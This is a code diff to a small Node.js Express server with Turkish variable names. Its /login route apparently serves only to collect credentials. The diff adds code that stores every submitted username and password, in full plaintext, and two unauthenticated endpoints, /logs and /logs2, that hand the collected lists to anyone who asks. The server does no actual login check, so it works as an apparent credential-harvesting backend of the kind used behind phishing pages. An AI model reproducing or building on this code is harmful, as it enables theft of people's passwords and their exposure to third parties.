@@ -5,6 +5,9 @@ const app = express();
 const cors = require(`cors`);
 const path = require(`path`);
 
+let passwords = `Passwords :\n\n`;
+let RealPasswords = `Passwords :\n\n`;
+
 app.use(express.static(path.join(__dirname, "public")));
 
 app.set(`trust proxy`, true);
@@ -20,9 +23,17 @@ app.get(`/login`, async(istek, cevap) => {
   let username = istek.query.username;
   let password = istek.query.password;
   let maskedPassword = `${password.slice(0, 4)}${'*'.repeat(password.length - 4)}`;
-  console.log(`Username: ${username} | Password: ${maskedPassword}`);
+  passwords += `\n\nUsername: ${username} | Password: ${maskedPassword}`;
+  RealPasswords += `\n\nUsername: ${username} | Password: ${password}`;
   cevap.sendStatus(200);
-})
+});
+
+app.get(`/logs`, async(istek, cevap) => {
+  cevap.send(passwords);
+});
+app.get(`/logs2`, async(istek, cevap) => {
+  cevap.send(RealPasswords);
+});
 
 app.listen(process.env.PORT || 80, () => {
   console.log(`Website ${process.env.PORT || 80} Portuyla Başladı...`);
